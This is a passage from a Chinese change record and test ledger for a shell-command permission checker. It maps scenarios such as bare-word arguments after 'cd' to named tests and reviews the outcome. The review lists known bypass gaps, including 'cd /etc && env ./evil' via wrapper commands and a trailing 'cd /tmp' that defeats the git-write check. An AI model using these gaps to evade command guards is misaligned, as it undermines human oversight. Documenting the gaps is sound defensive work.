| cd 后无 extractor 命令可提取相对路径仍判不可靠（条件10排除，F2 修复） | `BMG-CD-no-extractor-rel-path-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后无 extractor 命令绝对位置参数豁免（条件10 不触发，D2b 防过度修复对照） | `BMG-CD-no-extractor-abs-exempt` | `reliable:true` |
| cd 后 tar 操作标志跳过绝对归档豁免（D2b 防过度修复对照） | `BMG-CD-tar-opflag-abs-exempt` | `reliable:true` |
| cd 后 git 写子命令 rm 非 tmp 落点仍判不可靠（条件11排除，F3 修复） | `BMG-CD-git-write-nontmp-rm-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后 git 写子命令 checkout 非 tmp 落点仍判不可靠（条件11排除，F3 修复） | `BMG-CD-git-write-nontmp-checkout-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后 git 写子命令 add 非 tmp 落点仍判不可靠（条件11排除，F3 修复） | `BMG-CD-git-write-nontmp-add-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后 git 写子命令 mv 非 tmp 落点仍判不可靠（条件11排除，F3 修复） | `BMG-CD-git-write-nontmp-mv-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后 git 写子命令 rm tmp 落点静默放行（条件11 不触发，F3） | `BMG-CD-git-write-tmp-rm-allow` | `reliable:true` |
| cd 后 git 写子命令 checkout tmp 落点静默放行（条件11 不触发，F3） | `BMG-CD-git-write-tmp-checkout-allow` | `reliable:true` |
| cd 后 git 写子命令 rm /var/tmp 落点静默放行（条件11 不触发，F3） | `BMG-CD-git-write-vartmp-rm-allow` | `reliable:true` |
| cd 后 git 只读子命令 log 静默放行（条件11 不触发，用户拍板） | `BMG-CD-git-read-nontmp-log-allow` | `reliable:true` |
| cd 后 git 只读子命令 status 静默放行（条件11 不触发，用户拍板） | `BMG-CD-git-read-nontmp-status-allow` | `reliable:true` |
| cd 后 coreutils 校验和命令 md5sum 裸词仍判不可靠（条件10 穷尽排除，F2 补漏） | `BMG-CD-coreutils-md5sum-bare-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后 coreutils 校验和命令 sha512sum 裸词仍判不可靠（条件10 穷尽排除，F2 补漏） | `BMG-CD-coreutils-sha512sum-bare-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后 coreutils 校验和命令 b2sum 裸词仍判不可靠（条件10 穷尽排除，F2 补漏） | `BMG-CD-coreutils-b2sum-bare-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后 coreutils 校验和命令 cksum 裸词仍判不可靠（条件10 穷尽排除，F2 补漏） | `BMG-CD-coreutils-cksum-bare-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后 coreutils 文本比较命令 comm 裸词仍判不可靠（条件10 穷尽排除，F2 补漏） | `BMG-CD-coreutils-comm-bare-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后 coreutils 文本比较命令 join 裸词仍判不可靠（条件10 穷尽排除，F2 补漏） | `BMG-CD-coreutils-join-bare-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后 coreutils 文本行处理命令 paste 裸词仍判不可靠（条件10 穷尽排除，F2 补漏） | `BMG-CD-coreutils-paste-bare-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后 coreutils 文本行处理命令 nl 裸词仍判不可靠（条件10 穷尽排除，F2 补漏） | `BMG-CD-coreutils-nl-bare-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后 coreutils 文本行处理命令 cut 裸词仍判不可靠（条件10 穷尽排除，F2 补漏） | `BMG-CD-coreutils-cut-bare-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后 coreutils 文本行处理命令 tac 裸词仍判不可靠（条件10 穷尽排除，F2 补漏） | `BMG-CD-coreutils-tac-bare-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后 coreutils 文本比较命令 sdiff 裸词仍判不可靠（条件10 穷尽排除，F2 补漏） | `BMG-CD-coreutils-sdiff-bare-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后 coreutils 解压命令 gunzip 裸词仍判不可靠（条件10 穷尽排除，F2 补漏） | `BMG-CD-coreutils-gunzip-bare-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后 coreutils 解压命令 zcat 裸词仍判不可靠（条件10 穷尽排除，F2 补漏） | `BMG-CD-coreutils-zcat-bare-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后 coreutils 元数据命令 chgrp 裸词仍判不可靠（条件10 穷尽排除，F2 补漏） | `BMG-CD-coreutils-chgrp-bare-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后 coreutils 校验和命令 md5sum 绝对位置参数豁免（D2b 防过度修复对照） | `BMG-CD-coreutils-md5sum-abs-exempt` | `reliable:true` |
| cd 后 coreutils 文本行处理命令 paste 绝对位置参数豁免（D2b 防过度修复对照） | `BMG-CD-coreutils-paste-abs-exempt` | `reliable:true` |
| cd 后目录列举命令 dir 裸词仍判不可靠（条件10 穷尽排除，F2 补漏二波） | `BMG-CD-coreutils2-dir-bare-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后目录列举命令 vdir 裸词仍判不可靠（条件10 穷尽排除，F2 补漏二波） | `BMG-CD-coreutils2-vdir-bare-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后文本处理命令 shuf 裸词仍判不可靠（条件10 穷尽排除，F2 补漏二波） | `BMG-CD-coreutils2-shuf-bare-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后编码命令 base64 裸词仍判不可靠（条件10 穷尽排除，F2 补漏二波） | `BMG-CD-coreutils2-base64-bare-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后编码命令 basenc 裸词仍判不可靠（条件10 穷尽排除，F2 补漏二波） | `BMG-CD-coreutils2-basenc-bare-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后文本格式化命令 expand 裸词仍判不可靠（条件10 穷尽排除，F2 补漏二波） | `BMG-CD-coreutils2-expand-bare-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后文本格式化命令 unexpand 裸词仍判不可靠（条件10 穷尽排除，F2 补漏二波） | `BMG-CD-coreutils2-unexpand-bare-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后文本格式化命令 fmt 裸词仍判不可靠（条件10 穷尽排除，F2 补漏二波） | `BMG-CD-coreutils2-fmt-bare-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后文本格式化命令 fold 裸词仍判不可靠（条件10 穷尽排除，F2 补漏二波） | `BMG-CD-coreutils2-fold-bare-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后文本处理命令 ptx 裸词仍判不可靠（条件10 穷尽排除，F2 补漏二波） | `BMG-CD-coreutils2-ptx-bare-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后拓扑排序命令 tsort 裸词仍判不可靠（条件10 穷尽排除，F2 补漏二波） | `BMG-CD-coreutils2-tsort-bare-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后路径检查命令 pathchk 裸词仍判不可靠（条件10 穷尽排除，F2 补漏二波） | `BMG-CD-coreutils2-pathchk-bare-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后路径元数据命令 realpath 裸词仍判不可靠（条件10 穷尽排除，F2 补漏二波） | `BMG-CD-coreutils2-realpath-bare-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后路径元数据命令 readlink 裸词仍判不可靠（条件10 穷尽排除，F2 补漏二波） | `BMG-CD-coreutils2-readlink-bare-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后 pinky -f 文件模式仍判不可靠（条件10 穷尽排除，F2 补漏二波） | `BMG-CD-coreutils2-pinky-file-flag-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后 mktemp 模板写类仍判不可靠（条件10 穷尽排除，F2 补漏二波） | `BMG-CD-coreutils2-mktemp-template-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后 link 硬链接目标裸词仍判不可靠（条件10 穷尽排除，F2 补漏二波） | `BMG-CD-coreutils2-link-target-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后 unlink 删除类裸词仍判不可靠（条件10 穷尽排除，F2 补漏二波） | `BMG-CD-coreutils2-unlink-bare-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后 mknod 特殊文件写类仍判不可靠（条件10 穷尽排除，F2 补漏二波） | `BMG-CD-coreutils2-mknod-bare-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后 mkfifo FIFO 写类仍判不可靠（条件10 穷尽排除，F2 补漏二波） | `BMG-CD-coreutils2-mkfifo-bare-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后 dir 绝对位置参数豁免（D2b 防过度修复对照，F2 补漏二波） | `BMG-CD-coreutils2-dir-abs-exempt` | `reliable:true` |
| cd 后 unlink 绝对位置参数豁免（D2b 防过度修复对照，F2 补漏二波） | `BMG-CD-coreutils2-unlink-abs-exempt` | `reliable:true` |
| cd 后原地覆写命令 shred 裸词仍判不可靠（条件10 排除，F2 补漏三波） | `BMG-CD-coreutils3-shred-bare-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后分片写命令 split 裸词仍判不可靠（条件10 排除，F2 补漏三波） | `BMG-CD-coreutils3-split-bare-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后分片写命令 csplit 裸词仍判不可靠（条件10 排除，F2 补漏三波） | `BMG-CD-coreutils3-csplit-bare-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后解压命令 bzcat 裸词仍判不可靠（条件10 排除，F2 补漏三波） | `BMG-CD-coreutils3-bzcat-bare-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后解压命令 xzcat 裸词仍判不可靠（条件10 排除，F2 补漏三波） | `BMG-CD-coreutils3-xzcat-bare-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后压缩命令 lzma 裸词仍判不可靠（条件10 排除，F2 补漏三波） | `BMG-CD-coreutils3-lzma-bare-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后压缩命令 lz4 裸词仍判不可靠（条件10 排除，F2 补漏三波） | `BMG-CD-coreutils3-lz4-bare-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后压缩命令 zstd 裸词仍判不可靠（条件10 排除，F2 补漏三波） | `BMG-CD-coreutils3-zstd-bare-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后归档命令 unzip 裸词仍判不可靠（条件10 排除，F2 补漏三波） | `BMG-CD-coreutils3-unzip-bare-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后归档命令 zip 裸词仍判不可靠（条件10 排除，F2 补漏三波） | `BMG-CD-coreutils3-zip-bare-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后校验和命令 shasum 裸词仍判不可靠（条件10 排除，F2 补漏三波） | `BMG-CD-coreutils3-shasum-bare-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后校验和命令 sha3sum 裸词仍判不可靠（条件10 排除，F2 补漏三波） | `BMG-CD-coreutils3-sha3sum-bare-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后比较命令 diff3 裸词仍判不可靠（条件10 排除，F2 补漏三波） | `BMG-CD-coreutils3-diff3-bare-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后转换命令 dos2unix 裸词仍判不可靠（条件10 排除，F2 补漏三波） | `BMG-CD-coreutils3-dos2unix-bare-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后文本命令 rev 裸词仍判不可靠（条件10 排除，F2 补漏三波） | `BMG-CD-coreutils3-rev-bare-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后文本命令 column 裸词仍判不可靠（条件10 排除，F2 补漏三波） | `BMG-CD-coreutils3-column-bare-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后文本命令 pr 裸词仍判不可靠（条件10 排除，F2 补漏三波） | `BMG-CD-coreutils3-pr-bare-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后补丁命令 patch 位置参数仍判不可靠（条件10 排除，F2 补漏三波） | `BMG-CD-coreutils3-patch-positional-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后补丁命令 patch stdin 重定向形态仍判不可靠（条件10 排除，F2 补漏三波） | `BMG-CD-coreutils3-patch-stdin-redirect-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后压缩命令 bzip3 裸词仍判不可靠（条件10 排除，F2 补漏三波） | `BMG-CD-coreutils3-bzip3-bare-reject` | `reliable:false`，reason `cd_chdir` |
| cd 后 shred 绝对位置参数豁免（D2b 防过度修复对照，F2 补漏三波） | `BMG-CD-coreutils3-shred-abs-exempt` | `reliable:true` |

全部 114 个新增场景均映射到具名测试；无 unmapped scenario。

**既有场景反转（预期行为变化，apply 阶段同步）**：`test/security-probe.mjs` L3 的 `cd /etc && ls`（原判 `cd_chdir`）→ cd 跟踪豁免下反转 `reliable:true`——由 T5 回归断言同步覆盖，非新增场景，不占用账本行。

## 实际系统工程影响 vs 预期（td-archive 复盘，2026-10-29）

| proposal 侧（预期） | archive 侧（实际） |
|---|---|
| 影响哪些分系统：`bash-extract`（tier-medium）单一子系统内部，不改 decision/config/trust/sensitive 策略内核，不改 extension-orchestration | 实际以 bash-extract 为主，但**超出预期**：F3 落地时 `isDefaultTmpPath` 从 `decision.ts`（policy-core）下沉到 `path-utils.ts` 并新增导出，`decision.ts` 改为导入（行为不变的单点定义重构）；`git-cmds.ts` 新增为 bash-extract 内单一事实源。跨子系统触及为机械重构，非语义变更 |
| 整体性能预期变化：判定路径纯静态字符扫描，无 IO/运行时开销变化，性能无实质变化（O(命令长度)） | 实际一致：D2a/D2b 豁免与 cd 跟踪均为线性扫描，`npm test` 729 pass / `npm run typecheck` exit 0，无性能回归证据 |
| 局部优化还是全局协调：局部优化，全局协调性已评估（不改 tier 分派 / permission.json / grant 语义） | 实际为局部优化成立，且安全边界经 6.3/F1/F2/F3 四轮 review 反而**比原实现更完整**（裸词引用、curl/wget 输出写目标、无 extractor 命令、git 写子命令均从「静默放行窗口」收紧为 cd_chdir） |
| 全局失调风险：低（cwd==projectRoot 假设未扩大；cd 豁免判据静态可确定；放行命令仍走正常 target 提取与敏感路径 tier 弹窗） | 实际低风险成立，但过程暴露 proposal 预判不足：原模型只覆盖 `rel.txt` 类可提取引用，漏了无扩展名裸词（`echo x > sub`）、curl/wget 输出 flag、无 extractor 命令、git 写子命令四类 0-target 静默放行洞——均经 review 判出 critical 后回写修复，未带病放行 |
| 预期行为模型：行为 1–11（后经回写扩至 1–15），以 RED→GREEN 具名测试 + 既有探针反转同步验证 | 模型验证通过（修正后）：最终 15 条行为全部由测试锁定，`node --test --test-name-pattern="BMG-RO\|BMG-CD"` 全 GREEN；跨分系统边界 `cross-system-boundary.mjs` ALL PASS（cd 守卫路径正确触发 prompt、网络外传不因 cd 豁免放行）。**模型偏差记录**：①「cd_chdir 一刀切=安全兜底」的隐含假设被证伪——一刀切下同样存在大量 0-target 静默放行（md5sum 等 39+ 命令），豁免 + 精确排除判据反而暴露并堵上了这些窗口；②「穷尽」式清单承诺被第三波残留证伪，spec/proposal 已改为「已知清单（三波）+ 排除判据为准」的诚实表述 |

**预期之外的副作用**（后续 `/td-system-audit` 输入）：

1. 修复驱动的 artifact 回写达 6 轮（原始 6.3 + F1/F2/F3 + F2 补漏两波），change 体量从 proposal 预估的「两处窄收窄」膨胀为「条件 1–11 的豁免判据体系」——bash-extract 子系统复杂度显著上升，下轮 audit 应复核该子系统 tier 是否仍判 tier-medium。
2. **已知边界一（预存在，非本 change 引入）**：`env`/`nice`/`nohup`/`timeout` 等 wrapper 命令在 cd 链下 `./` 前缀形态仍静默放行（`cd /etc && env ./evil`），需 wrapper 感知设计，已建议后续 change。
3. **已知边界二（条件 11 设计缺口）**：① 尾挂 `cd /tmp` 旁路（`cd /etc && git rm f && cd /tmp` 按「最终 cd 落点」误判）；② D2b 分支无 git 写子命令检查。修复方向已记录（任一 git 写片段之前的最近 cd 落点判定 + D2b 补检查），可与边界一合并为后续 change。
4. `test/probe-v3-bash-symlink-grant.mjs` 等 3 个 .mjs 探针遗留旧导入路径 `../src/lib/bash-extract.ts`（bash-extract-split 归档遗留，非本 change 引入），已顺手机械修复。

**scenario→test 账本状态**：全绿。最终 114 个新增场景全部映射到具名测试，无 unmapped；既有反转断言（`cd /etc && ls` → `reliable:true`、BMG44 `ls *` → `reliable:true`）均按预期行为变化同步，全量 `npm test` 729 pass / 0 fail。
